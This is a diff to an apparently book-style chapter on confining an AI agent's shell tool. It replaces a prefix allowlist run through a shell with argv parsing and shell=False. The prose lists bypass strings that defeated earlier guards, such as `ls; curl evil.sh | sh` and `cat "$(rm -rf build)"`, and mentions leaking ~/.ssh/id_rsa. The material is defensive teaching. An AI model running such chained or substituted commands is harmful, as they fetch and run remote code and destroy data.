@@ -353,41 +353,42 @@ def read_file(path: str) -> str:
         raise ValueError(f"path {path!r} escapes the project root")
     return p.read_text(encoding="utf-8")
 
-@tools.tool
-def run_command(command: str) -> str:
-    """Run a shell command and return stdout and stderr."""
-    proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
-    return proc.stdout + proc.stderr
-
-OPERATOR_CHARS = set(";|&<>()")
+# Each entry is matched as a whole token sequence against the parsed argument
+# vector, never as a string prefix, so "ls" admits `ls -la` and not `lsof`.
 ALLOWED_COMMANDS = ("git status", "git diff", "git log", "git show",
                     "ls", "cat", "rg", "python -m pytest")
 
-def shell_operators(command: str) -> list[str]:
-    """Operators the shell would act on, ignoring characters inside quotes."""
-    if "\n" in command or "\r" in command:
-        return ["newline"]      # shlex calls it whitespace; the shell does not
-    lexer = shlex.shlex(command, punctuation_chars=True)
-    lexer.commenters = ""   # the shell starts a comment only at a word boundary
-    lexer.whitespace_split = True
+def allowed_argv(command: str) -> list[str] | None:
+    """Parse command into an argv that needs no shell, or None if not allowed."""
     try:
-        tokens = list(lexer)
-    except ValueError as exc:
-        return [f"unparsable ({exc})"]      # fail closed on unbalanced quotes
-    return [t for t in tokens if t and (set(t) <= OPERATOR_CHARS or "`" in t)]
+        argv = shlex.split(command)
+    except ValueError:
+        return None                     # unbalanced quotes: fail closed
+    if not argv:
+        return None
+    for entry in ALLOWED_COMMANDS:
+        head = entry.split()
+        if argv[:len(head)] == head:
+            return argv
+    return None
+
+@tools.tool
+def run_command(command: str) -> str:
+    """Run one allowlisted command with plain arguments and no shell syntax,
+    and return its stdout and stderr."""
+    argv = allowed_argv(command)
+    if argv is None:
+        return "Error: not an allowlisted command, or it needs a shell."
+    proc = subprocess.run(argv, cwd=ROOT, capture_output=True, text=True, timeout=60)
+    return proc.stdout + proc.stderr
 
 def command_allowlist(name: str, args: dict) -> HookDecision:
-    if name == "run_command":
-        command = args.get("command", "").strip()
-        found = shell_operators(command)
-        if found:
-            return HookDecision(
-                allow=False,
-                reason=(f"Shell operators ({', '.join(found)}) are not allowed; "
-                        "issue one command per call."),
-            )
-        if not any(command == c or command.startswith(c + " ") for c in ALLOWED_COMMANDS):
-            return HookDecision(allow=False, reason="Command not on allowlist.")
+    if name == "run_command" and allowed_argv(args.get("command", "")) is None:
+        return HookDecision(
+            allow=False,
+            reason=("Allowed commands are " + ", ".join(ALLOWED_COMMANDS) +
+                    ", with plain arguments and no shell syntax."),
+        )
     return HookDecision()
 
 agent = Agent(provider, tools,
@@ -403,15 +404,29 @@ make_subagent_tool(agent, name="research",
 print(agent.run("Review the diff in HEAD for correctness risks."))
 ```
 
-The allowlist hook is small, and every one of its checks earns its place.
-`run_command` executes through a shell, so a prefix test on its own is not a policy: `ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word, and both would run.
-Rejecting shell operators first is what makes the prefix meaningful, and matching on a token boundary rather than a bare prefix is what stops `ls` from admitting `lsof` and `lsblk`.
-Finding those operators is a tokenizing problem rather than a substring problem, because a substring scan both misses a newline and falsely rejects `rg 'foo|bar'`, whose pipe is quoted and therefore literal.
-A borrowed tokenizer has to be corrected where its grammar differs from the shell's, and `shlex` differs in two places: it treats a line break as whitespace, which the check settles before tokenizing, and it treats `#` as a comment anywhere in the string, while the shell begins a comment only at a word boundary.
-Leaving `commenters` at its default is enough to lose the whole guard, because `cat notes.md#x && rm -rf build` then tokenizes to `cat notes.md` with no operators, passes the allowlist on `cat`, and runs both commands.
+The allowlist is small, and the shape of it is the lesson rather than the contents.
+The obvious version of this tool takes the model's string, checks it against a list of approved prefixes, and passes it to `subprocess.run(..., shell=True)`.
+That version does not work, and it is worth saying plainly that earlier drafts of this chapter shipped it and were bypassed repeatedly.
+`ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word.
+Adding a scan for shell operators catches those and misses a bare newline, which chains commands just as well as `;`.
+Rewriting the scan on `shlex` catches the newline and misses `cat notes.md#x && rm -rf build`, because `shlex` strips everything after a `#` while the shell starts a comment only at a word boundary.
+Clearing `commenters` catches that and misses `cat "$(rm -rf build)"`, because `shlex` hands back the quoted substitution as one ordinary token while the shell runs it.
+Each fix was correct and each left the next hole open, because the guard was predicting how a shell would split a string that a shell was then going to split again, under a grammar with quoting, comments, substitution, and expansion in it.
+A guard like that is a partial reimplementation of `bash` and should be assumed wrong.
+
+So `allowed_argv` removes the shell instead of trying to out-parse it.
+It splits the command once with `shlex.split`, matches the leading tokens against one allowlist entry, and returns the argument vector, which `run_command` executes with `shell=False`.
+Nothing re-interprets the string afterwards, so `;`, `&&`, a newline, `#`, and `$(...)` all arrive at the program as literal arguments: `cat "$(rm -rf build)"` becomes `cat` looking for a file with a strange name, which is the right answer for a command nobody allowed.
+Unbalanced quotes make `shlex.split` raise, and the command fails closed.
+Comparing token lists rather than strings also makes the match exact for free, so `ls` no longer admits `lsof` and `git status` no longer admits `git status-hack`.
 The entries are subcommands rather than programs for the same reason: a bare `git` on the allowlist of a review agent also authorizes `git push`, `git reset --hard`, and `git clean -fdx`, which is why Volume 13 Chapter 07 names `git push` on its deny list, and naming the four read-only subcommands here settles the question in one place instead of two.
-`read_file` resolves before it reads, so the review agent and the research subagent it delegates to are both confined to the project, and neither can be talked into returning `~/.ssh/id_rsa` through the parent's context.
-Write it this way and the hook is policy as code; write it as a `startswith` over a tuple of program names and it is a suggestion with a `subprocess` behind it.
+
+The check appears twice on purpose, and the duplication is the point rather than an oversight.
+The hook is the policy layer: it produces the denial the model reads and the `allowed: False` line in the transcript, which is what makes the decision reviewable.
+The tool's own call is capability confinement: `run_command` is incapable of constructing a shell no matter which registry it is wired into or whose hooks are attached, so a future caller who forgets the gate loses the audit trail rather than the sandbox.
+Policy you can read and a capability you cannot exceed are different guarantees, and a framework that offers only the first has talked itself into trusting every future wiring decision.
+`read_file` resolves before it reads for the same reason, so the review agent and the research subagent it delegates to are both confined to the project, and neither can be talked into returning `~/.ssh/id_rsa` through the parent's context.
+Write it this way and the hook is policy as code; write it as a `startswith` over a tuple of program names with a shell behind it and it is a suggestion.
 
 The ordering in the last three statements is load-bearing.
 The parent agent is constructed first so the subagent tool can be registered against it, which is how the subagent inherits the parent's hooks instead of silently running with none.
